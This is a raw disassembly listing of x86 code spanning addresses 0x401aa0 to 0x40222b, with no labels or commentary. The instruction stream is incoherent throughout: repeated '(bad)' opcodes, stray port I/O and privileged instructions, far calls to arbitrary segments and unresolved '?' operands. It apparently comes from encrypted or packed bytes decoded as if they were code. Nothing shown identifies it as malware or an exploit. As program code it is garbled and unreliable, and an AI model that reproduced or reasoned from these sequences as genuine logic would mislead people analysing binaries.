  401aa0:	aaa    
  401aa1:	sub    DWORD PTR [eax],eax
  401aa3:	xchg   edi,eax
  401aa4:	ins    BYTE PTR es:[edi],dx
  401aa5:	ins    DWORD PTR es:[edi],dx
  401aa6:	jle    0x401aba
  401aa8:	rcl    BYTE PTR [edi],1
  401aaa:	lods   al,BYTE PTR ds:[esi]
  401aab:	mov    bl,BYTE PTR [edi-0x7f]
  401aae:	arpl   WORD PTR [ecx-0x1b],cx
  401ab1:	nop
  401ab2:	push   esp
  401ab3:	add    bl,BYTE PTR [edx]
  401ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab6:	mov    ecx,edi
  401ab8:	ins    DWORD PTR es:[edi],dx
  401ab9:	and    eax,0xb161167e
  401abe:	cld    
  401abf:	xor    DWORD PTR [eax],esp
  401ac1:	mov    ebx,0xd89f6c0a
  401ac6:	jns    0x401b37
  401ac8:	test   al,0x4a
  401aca:	mov    ah,0xe
  401acc:	scas   eax,DWORD PTR es:[edi]
  401acd:	mov    ?,WORD PTR [ebx]
  401acf:	fidiv  DWORD PTR [esi+ebx*1+0x1f4df3e]
  401ad6:	arpl   WORD PTR [eax],dx
  401ad8:	stos   BYTE PTR es:[edi],al
  401ad9:	mov    edx,0x8a5a4105
  401ade:	addr16 or eax,0x5bf28180
  401ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae5:	out    0xf7,eax
  401ae7:	inc    esi
  401ae8:	fnsave [esi]
  401aea:	pop    edx
  401aeb:	outs   dx,DWORD PTR ds:[esi]
  401aec:	pusha  
  401aed:	jne    0x401b4e
  401aef:	xchg   edi,eax
  401af0:	mov    cl,0xa2
  401af2:	cmp    esp,DWORD PTR [edi+0x9bf9e64]
  401af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401af9:	xchg   esi,eax
  401afa:	mov    BYTE PTR [eax+ebx*8],bh
  401afd:	or     ebx,ebp
  401aff:	xchg   edx,eax
  401b00:	jge    0x401b61
  401b02:	jne    0x401b3c
  401b04:	mov    esi,0x39548a7d
  401b09:	mov    esp,ebx
  401b0b:	dec    ebx
  401b0c:	fidiv  DWORD PTR fs:[eax]
  401b0f:	sbb    eax,0x9568c7fc
  401b14:	into   
  401b15:	mov    bh,0xf0
  401b17:	push   eax
  401b18:	push   es
  401b19:	add    al,cl
  401b1b:	push   ebx
  401b1c:	inc    edx
  401b1d:	ret    
  401b1e:	mov    bl,0x7f
  401b20:	add    BYTE PTR [edx],bl
  401b22:	xchg   esi,eax
  401b23:	jecxz  0x401b23
  401b25:	or     ch,cl
  401b27:	lds    ecx,FWORD PTR [edx+eiz*4]
  401b2a:	mov    ds:0xa07a9e61,eax
  401b2f:	(bad)  
  401b31:	das    
  401b32:	mov    eax,ds:0x50ab3331
  401b37:	in     al,0x34
  401b39:	push   0x66
  401b3b:	(bad)  
  401b3c:	sub    DWORD PTR [esi],ebx
  401b3e:	cmp    ah,BYTE PTR ds:0xdcef876d
  401b44:	mov    esp,0xc132f79f
  401b49:	outs   dx,DWORD PTR ds:[esi]
  401b4a:	sahf   
  401b4b:	scas   al,BYTE PTR es:[edi]
  401b4c:	dec    ebp
  401b4d:	inc    ebx
  401b4e:	push   cs
  401b4f:	mov    ch,ah
  401b51:	iret   
  401b52:	mov    dh,0xf
  401b54:	dec    esi
  401b55:	scas   eax,DWORD PTR es:[edi]
  401b56:	add    DWORD PTR [ebx-0x73bcb578],ebx
  401b5c:	in     eax,0xc3
  401b5e:	arpl   cx,cx
  401b60:	scas   al,BYTE PTR es:[edi]
  401b61:	gs push 0xffffff8a
  401b64:	icebp  
  401b65:	or     DWORD PTR [edi],eax
  401b67:	enter  0xf085,0xaa
  401b6b:	dec    BYTE PTR [eax+0xe]
  401b6e:	push   eax
  401b6f:	test   al,0xc0
  401b71:	lahf   
  401b72:	xor    al,0xae
  401b74:	cwde   
  401b75:	dec    eax
  401b76:	fidivr WORD PTR [edi+esi*8-0x2e53f7a8]
  401b7d:	je     0x401bac
  401b7f:	and    eax,0x371348f
  401b84:	xor    DWORD PTR [esi-0x1e],esp
  401b87:	jns    0x401b60
  401b89:	js     0x401b2e
  401b8b:	jl     0x401b91
  401b8d:	mov    ah,0xb2
  401b8f:	js     0x401b96
  401b91:	push   ss
  401b92:	push   esi
  401b93:	fcomp  DWORD PTR [edi+0x7d]
  401b96:	inc    esp
  401b97:	test   DWORD PTR [ecx],edx
  401b99:	sbb    al,BYTE PTR ds:0xbb0538bb
  401b9f:	test   al,0x7c
  401ba1:	popa   
  401ba2:	mov    ch,0x19
  401ba4:	push   ebp
  401ba5:	inc    ebx
  401ba6:	fst    DWORD PTR [edx-0xb13ca35]
  401bac:	iret   
  401bad:	retf   0xb9ba
  401bb0:	jne    0x401b46
  401bb2:	add    ch,BYTE PTR [edi+edx*2]
  401bb5:	aad    0xfa
  401bb7:	stos   BYTE PTR es:[edi],al
  401bb8:	repnz (bad) 
  401bba:	stc    
  401bbb:	xor    esi,esi
  401bbd:	sbb    DWORD PTR ds:0x730653c7,ebx
  401bc3:	fwait
  401bc4:	mov    ds:0x6045365a,eax
  401bc9:	adc    esp,DWORD PTR [ebp+0x17]
  401bcc:	and    al,0xd4
  401bce:	mov    al,0x3b
  401bd0:	add    al,0xbb
  401bd2:	les    esp,FWORD PTR [ecx+0x2e]
  401bd5:	xor    DWORD PTR [ecx],edx
  401bd7:	retf   
  401bd8:	inc    ebp
  401bd9:	stc    
  401bda:	fld    QWORD PTR [eax+edx*2-0x4ad89e86]
  401be1:	test   al,0x44
  401be3:	mov    esp,0xfadd93ab
  401be8:	pop    ds
  401be9:	mov    WORD PTR [ebp-0x75cf4d96],es
  401bef:	push   es
  401bf0:	shl    esi,0xfe
  401bf3:	xchg   edi,eax
  401bf4:	dec    eax
  401bf5:	push   cs
  401bf6:	push   esp
  401bf7:	inc    ebp
  401bf8:	cmp    BYTE PTR ds:0x51ec178c,cl
  401bfe:	pextrw esp,(bad),0xc5
  401c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c01:	and    eax,0x8511051a
  401c06:	inc    ebx
  401c07:	pop    ecx
  401c08:	mov    ecx,0xc7e8d6e8
  401c0d:	push   ebx
  401c0e:	jmp    0xa64bd97b
  401c13:	and    al,0x18
  401c15:	sar    edx,1
  401c17:	xchg   ebp,eax
  401c18:	popf   
  401c19:	jae    0x401beb
  401c1b:	lds    edx,FWORD PTR [esi+eax*1-0x6b4656d8]
  401c22:	dec    esi
  401c23:	stos   DWORD PTR es:[edi],eax
  401c24:	std    
  401c25:	jae    0x401bcd
  401c27:	(bad)  
  401c28:	retf   0x7acf
  401c2b:	ss pop ss
  401c2d:	and    DWORD PTR [ebp+0x48],0x8f5f62ee
  401c34:	cwde   
  401c35:	(bad)  
  401c36:	test   DWORD PTR [ebp+0x3a],0x63af6487
  401c3d:	std    
  401c3e:	pop    es
  401c3f:	mov    al,ds:0x7f242b7a
  401c44:	daa    
  401c45:	inc    eax
  401c46:	lea    esi,[edx-0x74]
  401c49:	push   edi
  401c4a:	out    dx,eax
  401c4b:	dec    esp
  401c4c:	scas   al,BYTE PTR es:[edi]
  401c4d:	imul   ebp,ecx,0x70
  401c50:	jmp    0x401cb3
  401c52:	je     0x401c2c
  401c54:	mov    al,ds:0xc5a0b246
  401c59:	mov    ?,esp
  401c5b:	mov    ah,cl
  401c5d:	aam    0x96
  401c5f:	mov    al,ds:0x6d76a748
  401c64:	retw   
  401c66:	cmc    
  401c67:	aaa    
  401c68:	mov    BYTE PTR [esi-0x37],ch
  401c6b:	cmp    al,0xa4
  401c6d:	retf   0x6450
  401c70:	aam    0x2f
  401c72:	inc    esp
  401c73:	cmp    ebp,edx
  401c75:	(bad)  
  401c76:	push   edx
  401c77:	shl    DWORD PTR ds:0xd9bcf432,cl
  401c7d:	daa    
  401c7e:	out    0xfa,al
  401c80:	inc    eax
  401c81:	inc    edi
  401c82:	in     eax,0x98
  401c84:	add    esi,DWORD PTR [ebp-0x3e]
  401c87:	int    0x27
  401c89:	aaa    
  401c8a:	push   0xaa2fd7b7
  401c8f:	xor    bh,dl
  401c91:	mov    al,0x6a
  401c93:	mov    ecx,0xb0adf031
  401c98:	(bad)  
  401c99:	int    0xa3
  401c9b:	ins    DWORD PTR es:[edi],dx
  401c9c:	xor    eax,0x4d092be7
  401ca1:	fdiv   DWORD PTR [ebp+0x5ae2ef15]
  401ca7:	pop    ss
  401ca8:	mov    bl,0x2a
  401caa:	inc    esi
  401cab:	outs   dx,DWORD PTR ds:[esi]
  401cac:	jbe    0x401d1e
  401cae:	pop    es
  401caf:	sahf   
  401cb0:	out    0xc9,al
  401cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cb3:	daa    
  401cb4:	sub    BYTE PTR [ebp-0x2fb7e3c2],bl
  401cba:	mov    WORD PTR [edi],?
  401cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cbd:	xchg   esp,eax
  401cbe:	or     eax,0xc636a44a
  401cc3:	das    
  401cc4:	xchg   ebx,eax
  401cc5:	xor    al,0xfb
  401cc7:	push   0xac74dae
  401ccc:	aad    0x32
  401cce:	sbb    BYTE PTR [ebx+esi*2-0x32],al
  401cd2:	jo     0x401ce5
  401cd4:	outs   dx,BYTE PTR fs:[esi]
  401cd6:	shr    dh,1
  401cd8:	xor    eax,0x67179d92
  401cdd:	xchg   ebp,eax
  401cde:	xlat   BYTE PTR ds:[ebx]
  401cdf:	push   esi
  401ce0:	mov    ds:0x7e4c48bc,eax
  401ce5:	repnz loope 0x401d02
  401ce8:	push   edx
  401ce9:	mov    dl,0xed
  401ceb:	sbb    BYTE PTR [esi],dl
  401ced:	or     eax,0x9f3c0087
  401cf2:	xchg   esp,eax
  401cf3:	xchg   ebp,eax
  401cf4:	push   ebx
  401cf5:	push   ebx
  401cf6:	out    0x69,eax
  401cf8:	cwde   
  401cf9:	rol    DWORD PTR [ecx-0x367860ba],1
  401cff:	call   DWORD PTR [ecx]
  401d01:	push   cs
  401d02:	xor    BYTE PTR [edi],0x6
  401d05:	call   0x8ab4:0xbb3f8d14
  401d0c:	inc    esi
  401d0d:	dec    eax
  401d0e:	enter  0x7567,0xca
  401d12:	in     eax,dx
  401d13:	cmp    ah,BYTE PTR [eax+edx*8-0x21397be5]
  401d1a:	add    esi,esp
  401d1c:	mov    dl,0xd
  401d1e:	pop    ds
  401d1f:	mov    edi,0x5c4a0e2e
  401d24:	xchg   ecx,eax
  401d25:	mov    esp,0x722b6f38
  401d2a:	dec    esi
  401d2b:	push   cs
  401d2c:	fs (bad) 
  401d2e:	(bad)  
  401d2f:	pop    ebp
  401d30:	dec    esp
  401d31:	mov    ds:0xc93c5a8,eax
  401d36:	add    cl,BYTE PTR [ecx]
  401d38:	add    DWORD PTR [ecx-0x689a7a58],edx
  401d3e:	cmp    BYTE PTR [edx-0x2d],0x66
  401d42:	cwde   
  401d43:	add    esp,DWORD PTR [edi+edi*4+0x1c]
  401d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d48:	data16 (bad) 
  401d4a:	jmp    ecx
  401d4c:	cdq    
  401d4d:	mov    dl,0x1a
  401d4f:	pop    ecx
  401d50:	cmc    
  401d51:	test   BYTE PTR [ecx],bh
  401d53:	sub    eax,0xae1d52b3
  401d58:	push   0xd5abb1b8
  401d5d:	rol    BYTE PTR [ecx+edi*1+0x4eb9c024],cl
  401d64:	inc    edx
  401d65:	mov    ebp,0x9b6f6664
  401d6a:	imul   esp,DWORD PTR [edi-0x5f],0xffffff97
  401d6e:	ret    0xa168
  401d71:	(bad)  
  401d72:	cmc    
  401d73:	mov    ecx,0x5f49b872
  401d78:	popa   
  401d79:	sti    
  401d7a:	or     al,0xee
  401d7c:	sub    ch,BYTE PTR [esp+ecx*1-0x37]
  401d80:	pop    ecx
  401d81:	add    al,0xda
  401d83:	call   0x9687:0x788f3648
  401d8a:	inc    edi
  401d8b:	fnstcw WORD PTR [edi+0x18]
  401d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8f:	mov    ?,WORD PTR [esp+eax*4+0x0]
  401d93:	fwait
  401d94:	and    DWORD PTR [edx-0x287b2274],ebp
  401d9a:	mov    ebp,ebp
  401d9c:	xchg   esi,eax
  401d9d:	in     al,dx
  401d9e:	and    al,0x81
  401da0:	outs   dx,DWORD PTR ds:[esi]
  401da1:	adc    esp,DWORD PTR [ecx+ecx*8-0x68]
  401da5:	lock xchg BYTE PTR [ecx+0x43],ah
  401da9:	nop
  401daa:	stc    
  401dab:	xchg   esp,eax
  401dac:	pop    eax
  401dad:	mov    BYTE PTR [ebx-0x55],dh
  401db0:	sbb    esi,edi
  401db2:	ret    
  401db3:	push   ecx
  401db4:	leave  
  401db5:	daa    
  401db6:	sti    
  401db7:	mov    dl,0x16
  401db9:	sbb    BYTE PTR [edx],dl
  401dbb:	xchg   esp,eax
  401dbc:	imul   eax,DWORD PTR [esi],0xffffffe7
  401dbf:	fxch   st(2)
  401dc1:	ret    
  401dc2:	sbb    al,0xb8
  401dc4:	cmp    ebx,esi
  401dc6:	jbe    0x401df0
  401dc8:	mov    al,ds:0xcd30732d
  401dcd:	pop    ecx
  401dce:	push   ebp
  401dcf:	mov    ecx,0x13a9c175
  401dd4:	ss call 0xe42348ab
  401dda:	push   0x1d
  401ddc:	(bad)  
  401ddd:	popa   
  401dde:	push   esp
  401ddf:	inc    ebp
  401de0:	adc    dl,BYTE PTR [eax-0x39]
  401de3:	sub    DWORD PTR [eax-0x181cd13],eax
  401de9:	or     esp,ebp
  401deb:	xor    al,0xf3
  401ded:	xor    BYTE PTR [ecx-0x333ba248],dh
  401df3:	dec    esp
  401df4:	mov    cl,0x2d
  401df6:	or     ch,0xc8
  401df9:	call   0x279d:0x600ab242
  401e00:	add    ebp,edx
  401e02:	adc    al,0x81
  401e04:	cwde   
  401e05:	jmp    0x401d9f
  401e07:	pop    ss
  401e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e09:	sub    al,ah
  401e0b:	or     cl,BYTE PTR [edi+0x4799bf5]
  401e11:	in     eax,0x21
  401e13:	pushf  
  401e14:	nop
  401e15:	sub    ebx,edx
  401e17:	inc    edx
  401e18:	scas   al,BYTE PTR es:[edi]
  401e19:	jmp    0xf63847b1
  401e1e:	(bad)  ds:0x2bf55cef
  401e24:	fimul  DWORD PTR [edx+0x26]
  401e27:	sub    al,BYTE PTR [esi+ecx*8-0x14]
  401e2b:	lock ss mov ebp,0xb2e5d9d5
  401e32:	mov    dh,0x49
  401e34:	adc    ch,0x71
  401e37:	loop   0x401e71
  401e39:	imul   edx,eax,0xe331ffa4
  401e3f:	pextrw esp,(bad),0xc5
  401e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e42:	jnp    0x401ea8
  401e44:	mov    ch,0x33
  401e46:	dec    DWORD PTR fs:[eax+0x6449176e]
  401e4d:	call   0x8d3f:0x7e6edc75
  401e54:	jp     0x401ddd
  401e56:	fs je  0x401def
  401e59:	adc    al,0x56
  401e5b:	repz adc BYTE PTR [edi],al
  401e5e:	(bad)  
  401e5f:	mov    ds:0x7817212,eax
  401e64:	call   0x68769899
  401e69:	push   esi
  401e6a:	jns    0x401e2f
  401e6c:	mov    ch,0x5d
  401e6e:	int    0xa7
  401e70:	rcl    DWORD PTR [esi],0xaa
  401e73:	fisubr DWORD PTR [eax+0x76]
  401e76:	xchg   edx,eax
  401e77:	mov    bl,0x43
  401e79:	jne    0x401e4e
  401e7b:	fadd   st,st(3)
  401e7d:	data16 mov bh,0xb7
  401e80:	inc    eax
  401e81:	(bad)  
  401e82:	out    0x16,al
  401e84:	sti    
  401e85:	inc    eax
  401e86:	pop    edi
  401e87:	dec    ecx
  401e88:	ror    BYTE PTR [edx-0x76],cl
  401e8b:	aad    0x17
  401e8d:	test   dh,bh
  401e8f:	xchg   esp,eax
  401e90:	nop
  401e91:	lds    ebp,FWORD PTR [ebx]
  401e93:	pop    ebp
  401e94:	mov    ds:0x4813c219,al
  401e99:	jle    0x401e99
  401e9b:	mov    dl,0x43
  401e9d:	cmp    eax,0x27b5cb09
  401ea2:	lds    ebp,FWORD PTR [esi-0x37374b5c]
  401ea8:	and    eax,edi
  401eaa:	xor    DWORD PTR [ebp+0x59],ebp
  401ead:	inc    edi
  401eae:	in     eax,dx
  401eaf:	add    DWORD PTR [edi+0x59],esp
  401eb2:	push   esi
  401eb3:	add    al,0x45
  401eb5:	mov    ah,0xac
  401eb7:	push   cs
  401eb8:	xchg   edi,eax
  401eb9:	test   al,0x3
  401ebb:	sti    
  401ebc:	ins    BYTE PTR es:[edi],dx
  401ebd:	scas   eax,DWORD PTR es:[edi]
  401ebe:	aam    0x70
  401ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec1:	mov    al,0x95
  401ec3:	or     eax,0x5d862fad
  401ec8:	pop    eax
  401ec9:	inc    eax
  401eca:	aam    0xd9
  401ecc:	mov    edx,0x62c5c258
  401ed1:	ins    DWORD PTR es:[edi],dx
  401ed2:	imul   DWORD PTR [edi+0x10]
  401ed5:	jmp    0xccdd49f3
  401eda:	pop    es
  401edb:	fcomp  DWORD PTR [eax-0x16]
  401ede:	loope  0x401e88
  401ee0:	cmp    ah,BYTE PTR [edx+0x3078dc45]
  401ee6:	imul   ecx,DWORD PTR [edi-0x7000dd17],0x6651acf9
  401ef0:	sub    eax,DWORD PTR [ecx-0x4e84bfe7]
  401ef6:	jb     0x401ec5
  401ef8:	(bad)  
  401ef9:	push   cs
  401efa:	pop    edx
  401efb:	pop    ss
  401efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401efd:	mov    fs,WORD PTR [esi-0x6b]
  401f00:	mov    esi,0xba09c375
  401f05:	enter  0x7a45,0xe6
  401f09:	xchg   ebx,eax
  401f0a:	jne    0x401f41
  401f0c:	xchg   DWORD PTR [esi],esi
  401f0e:	sub    BYTE PTR [esi],ch
  401f10:	inc    esp
  401f11:	add    al,0xbe
  401f13:	sbb    DWORD PTR [edx],ebp
  401f15:	mov    cl,0x19
  401f17:	jl     0x401edf
  401f19:	or     eax,0xb529123f
  401f1e:	pop    edi
  401f1f:	arpl   WORD PTR [ebp+0x75],ax
  401f22:	inc    edx
  401f23:	xor    edx,edi
  401f25:	test   al,0xdd
  401f27:	push   esp
  401f28:	loopne 0x401f44
  401f2a:	test   DWORD PTR [edx-0x2e58155b],0x7eb784dc
  401f34:	in     al,0x6a
  401f36:	imul   esp,DWORD PTR [esi-0x59],0xffffffc4
  401f3a:	out    0x42,al
  401f3c:	xchg   edx,eax
  401f3d:	cld    
  401f3e:	mov    bl,0x9
  401f40:	dec    ecx
  401f41:	dec    ecx
  401f42:	ret    
  401f43:	jns    0x401f30
  401f45:	mov    ecx,0x9af70f5d
  401f4a:	mov    esp,esp
  401f4c:	and    dl,BYTE PTR [edx]
  401f4e:	inc    esp
  401f4f:	sub    BYTE PTR [ecx],0xaa
  401f52:	push   esi
  401f53:	(bad)  
  401f54:	in     al,0x8a
  401f56:	pop    es
  401f57:	xchg   edi,eax
  401f58:	and    al,0xfd
  401f5a:	fisubr WORD PTR [esi]
  401f5c:	retf   
  401f5d:	mov    dl,0x7
  401f5f:	pop    ds
  401f60:	emms   
  401f62:	iret   
  401f63:	mov    eax,ds:0x279ed17b
  401f68:	fisttp QWORD PTR [esi+0x5]
  401f6b:	(bad)  
  401f6c:	lahf   
  401f6d:	out    0xf,eax
  401f6f:	js     0x401fad
  401f71:	maskmovq mm0,(bad)
  401f72:	test   DWORD PTR [ebx+0x3c00a41d],0x4aa15b0a
  401f7c:	jbe    0x401fb9
  401f7e:	sub    cl,dh
  401f80:	(bad)  
  401f81:	xor    bl,bl
  401f83:	bound  edx,QWORD PTR [edx+0x5b659da9]
  401f89:	mov    ebx,0x38a5897a
  401f8e:	inc    eax
  401f8f:	in     al,0x79
  401f91:	add    esi,DWORD PTR [edx-0x7b]
  401f94:	dec    edi
  401f95:	and    bh,al
  401f97:	test   al,0x61
  401f99:	(bad)  
  401f9a:	addr16 sti 
  401f9c:	js     0x401fa4
  401f9e:	clc    
  401f9f:	mov    BYTE PTR [eax-0x726e8116],dh
  401fa5:	inc    esi
  401fa6:	push   cs
  401fa7:	sbb    DWORD PTR [ebp+0x209390c0],eax
  401fad:	pop    esp
  401fae:	repz jecxz 0x401fa7
  401fb1:	std    
  401fb2:	xor    eax,esp
  401fb4:	mov    dh,0xb2
  401fb6:	mov    ?,WORD PTR [eax+0x4d]
  401fb9:	and    dl,BYTE PTR [ebx-0xb]
  401fbc:	mov    cl,bh
  401fbe:	jno    0x401f5a
  401fc0:	cwde   
  401fc1:	test   DWORD PTR [esi+edx*4+0x6b],ebx
  401fc5:	mov    eax,0x6196d965
  401fca:	inc    ecx
  401fcb:	xor    dh,BYTE PTR [esi+0x1af310ea]
  401fd1:	mov    eax,ds:0xd140778
  401fd6:	or     al,0x69
  401fd8:	pusha  
  401fd9:	sbb    dl,al
  401fdb:	sti    
  401fdc:	out    dx,al
  401fdd:	xchg   edx,eax
  401fde:	repnz and DWORD PTR [esp+ebx*2+0x2a2f2923],0xffffffdc
  401fe7:	imul   ebp,DWORD PTR [edi+ecx*4+0x641f6e82],0xffffffc3
  401fef:	lods   al,BYTE PTR ds:[esi]
  401ff0:	test   al,0xec
  401ff2:	cwde   
  401ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff4:	mov    ds,WORD PTR [esi-0x80]
  401ff7:	sub    esp,0xffffff9a
  401ffa:	xor    eax,0x81f7418d
  401fff:	nop
  402000:	test   DWORD PTR [ecx+eax*2],ebx
  402003:	mov    eax,0x5ec46c04
  402008:	fs xchg ebx,eax
  40200a:	retf   0x8651
  40200d:	pop    ebp
  40200e:	pop    eax
  40200f:	call   0x92c676e3
  402014:	js     0x40202a
  402016:	jne    0x401fe6
  402018:	lods   eax,DWORD PTR ds:[esi]
  402019:	rcr    DWORD PTR [eax-0x6b],1
  40201c:	or     BYTE PTR [ebx+0x7b3c85a1],bl
  402022:	and    al,0x32
  402024:	jmp    0xe246:0x1918a17e
  40202b:	jns    0x40206b
  40202d:	sahf   
  40202e:	jle    0x40205f
  402030:	leave  
  402031:	mov    al,0x49
  402033:	push   edi
  402034:	add    ebx,DWORD PTR [ebp-0x7]
  402037:	mov    eax,ds:0x975ef4c2
  40203c:	sub    al,0x55
  40203e:	dec    ecx
  40203f:	mov    ecx,0xf1695342
  402044:	sbb    DWORD PTR [edi],ecx
  402046:	out    dx,eax
  402047:	into   
  402048:	fnstcw WORD PTR [eax-0x7f259f17]
  40204e:	xor    esi,DWORD PTR [edi]
  402050:	sbb    ah,BYTE PTR [eax+0x7a]
  402053:	xor    ch,ch
  402055:	dec    edx
  402056:	int3   
  402057:	in     al,0x39
  402059:	xchg   ecx,eax
  40205a:	mov    ebp,0xc6d0863d
  40205f:	pop    ss
  402060:	cmp    DWORD PTR [edi+0x2f],0xf232fbbc
  402067:	popf   
  402068:	jecxz  0x402043
  40206a:	lods   eax,DWORD PTR ds:[esi]
  40206b:	std    
  40206c:	out    0x43,al
  40206e:	or     BYTE PTR [ecx+0x10],0x79
  402072:	ret    
  402073:	push   esi
  402074:	sbb    dh,ah
  402076:	fistp  WORD PTR [esi]
  402078:	pop    es
  402079:	inc    edx
  40207a:	mov    ds:0xd155aeb9,al
  40207f:	xchg   ebp,eax
  402080:	aad    0xbb
  402082:	arpl   WORD PTR [edi],dx
  402084:	into   
  402085:	add    eax,esp
  402087:	aas    
  402088:	dec    ebp
  402089:	adc    edi,edx
  40208b:	cs dec ebx
  40208d:	jmp    0x40206a
  40208f:	aam    0xbc
  402091:	je     0x40207d
  402093:	cmp    DWORD PTR [esi],0xffffffb9
  402096:	in     eax,0xd6
  402098:	mov    bh,0x5e
  40209a:	jns    0x4020b5
  40209c:	or     al,0x26
  40209e:	int    0x16
  4020a0:	pop    es
  4020a1:	cwde   
  4020a2:	pop    ds
  4020a3:	imul   ebx,esp,0x3e03defe
  4020a9:	ret    0x189e
  4020ac:	sub    eax,0xc5d9a6ff
  4020b1:	stos   BYTE PTR es:[edi],al
  4020b2:	jae    0x40204f
  4020b4:	fst    st(7)
  4020b6:	mov    eax,ds:0xbf68ffcb
  4020bb:	sub    edi,DWORD PTR [eax]
  4020bd:	not    BYTE PTR [edx-0x43]
  4020c0:	adc    ebx,DWORD PTR [eax-0x29fc4232]
  4020c6:	lods   al,BYTE PTR ds:[esi]
  4020c7:	mov    edx,0xd50f8b7d
  4020cc:	pop    eax
  4020cd:	cdq    
  4020ce:	mov    dl,0xdf
  4020d0:	into   
  4020d1:	fcmovb st,st(0)
  4020d3:	push   0x45
  4020d5:	outs   dx,BYTE PTR ds:[esi]
  4020d6:	push   es
  4020d7:	mov    dh,0xf
  4020d9:	cmp    esp,DWORD PTR [eax-0x36ca4485]
  4020df:	sbb    dh,bh
  4020e1:	mov    ebx,DWORD PTR [eax+edx*4+0xb]
  4020e5:	cmp    eax,0xc646deee
  4020ea:	sub    BYTE PTR [edx-0x78981ec4],0xff
  4020f1:	test   DWORD PTR [edx],esi
  4020f3:	fcmovnbe st,st(0)
  4020f5:	adc    dl,BYTE PTR ds:0x7e20011b
  4020fb:	xchg   esi,eax
  4020fc:	jo     0x4020f0
  4020fe:	push   ebp
  4020ff:	std    
  402100:	xchg   edx,eax
  402101:	sbb    al,0xf2
  402103:	mov    eax,ds:0xae6653b9
  402108:	push   ds
  402109:	adc    BYTE PTR [edi-0x3ee9016d],dh
  40210f:	push   edi
  402110:	(bad)  
  402111:	in     eax,0x5f
  402113:	call   0x3881:0xe9d52480
  40211a:	sbb    eax,0xb6604c35
  40211f:	xor    ch,BYTE PTR [edx+ebp*2]
  402122:	dec    ebx
  402123:	enter  0x283a,0x47
  402127:	mov    ds:0xf49994a4,al
  40212c:	fwait
  40212d:	(bad)  
  40212e:	outs   dx,DWORD PTR ds:[esi]
  40212f:	iret   
  402130:	repz fcom DWORD PTR ss:[edx]
  402134:	cld    
  402135:	call   0xe39a5792
  40213a:	sub    ch,BYTE PTR ds:0x236e837d
  402140:	outs   dx,DWORD PTR ds:[esi]
  402141:	(bad)  
  402142:	pop    ss
  402143:	xchg   esp,eax
  402144:	mov    ebx,0xaedec492
  402149:	mov    al,0x5c
  40214b:	leave  
  40214c:	scas   al,BYTE PTR es:[edi]
  40214d:	sar    DWORD PTR [esi+ebx*8-0x7c],0x7f
  402152:	fisttp WORD PTR ds:[edx]
  402155:	xchg   ecx,eax
  402156:	dec    edi
  402157:	out    0x8,eax
  402159:	pop    ebx
  40215a:	sti    
  40215b:	lahf   
  40215c:	pop    edx
  40215d:	inc    ebx
  40215e:	test   DWORD PTR [ebx-0x9],edx
  402161:	ret    
  402162:	adc    bh,ah
  402164:	(bad)  
  402165:	pop    eax
  402166:	aad    0x31
  402168:	adc    BYTE PTR [ebx+esi*4+0x3fe4bbd2],0x43
  402170:	ss cwde 
  402172:	push   ecx
  402173:	mov    BYTE PTR [eiz*2+0x26b47086],ch
  40217a:	sub    edx,eax
  40217c:	cmp    eax,0x78bc504
  402181:	popf   
  402182:	neg    BYTE PTR [edx]
  402184:	cs stos BYTE PTR es:[edi],al
  402186:	mov    dl,0x86
  402188:	xlat   BYTE PTR ds:[ebx]
  402189:	sbb    eax,0x27b4d087
  40218e:	sbb    DWORD PTR [ebx-0x78f2bbfb],ebx
  402194:	call   edx
  402196:	jge    0x4021d6
  402198:	push   ecx
  402199:	popf   
  40219a:	dec    esi
  40219b:	mov    ebp,0x2ba43783
  4021a0:	dec    edx
  4021a1:	test   DWORD PTR [ecx-0x55],0x277f8040
  4021a8:	push   ds
  4021a9:	inc    eax
  4021aa:	lds    esp,FWORD PTR ds:0x35fafacf
  4021b0:	call   0x4990:0xee75efbc
  4021b7:	jb     0x402219
  4021b9:	enter  0x100,0xf7
  4021bd:	stos   BYTE PTR es:[edi],al
  4021be:	mov    eax,ds:0x94a55cc9
  4021c3:	mov    edi,0xeea42999
  4021c8:	lods   eax,DWORD PTR ds:[esi]
  4021c9:	push   ebp
  4021ca:	pop    ecx
  4021cb:	adc    BYTE PTR [esi],dl
  4021cd:	inc    edi
  4021ce:	cmp    BYTE PTR [eax+0x3f],dl
  4021d1:	(bad)  
  4021d2:	arpl   WORD PTR [esi-0x7],cx
  4021d5:	xchg   ecx,eax
  4021d6:	sbb    al,0x7c
  4021d8:	inc    DWORD PTR ds:0xfe3ae485
  4021de:	xchg   esp,eax
  4021df:	mov    cl,0x33
  4021e1:	dec    edi
  4021e2:	cld    
  4021e3:	mov    ch,BYTE PTR [eax]
  4021e5:	cmp    cl,dh
  4021e7:	addr16 addr16 jmp 0x66b5:0x304a130c
  4021f0:	adc    esi,DWORD PTR [eax-0x1]
  4021f3:	aas    
  4021f4:	sbb    cl,BYTE PTR [ebx+0x6f]
  4021f7:	mov    al,BYTE PTR [edi-0x61]
  4021fa:	add    al,0xaa
  4021fc:	dec    edx
  4021fd:	sar    DWORD PTR [eax],1
  4021ff:	cmc    
  402200:	retfw  
  402202:	rol    BYTE PTR [edi+0x78449717],0x5c
  402209:	push   edx
  40220a:	inc    edx
  40220b:	push   esi
  40220c:	push   ecx
  40220d:	imul   ecx,DWORD PTR [ebp+0x1f7ba2e],0x5d2d7567
  402217:	jae    0x402276
  402219:	popf   
  40221a:	mov    ebp,0x1382dbeb
  40221f:	xor    DWORD PTR [eax+ebx*1],esi
  402222:	mov    esi,0x53914b02
  402227:	pop    eax
  402228:	std    
  402229:	push   cs
  40222a:	hlt    
  40222b:	out    0x86,al
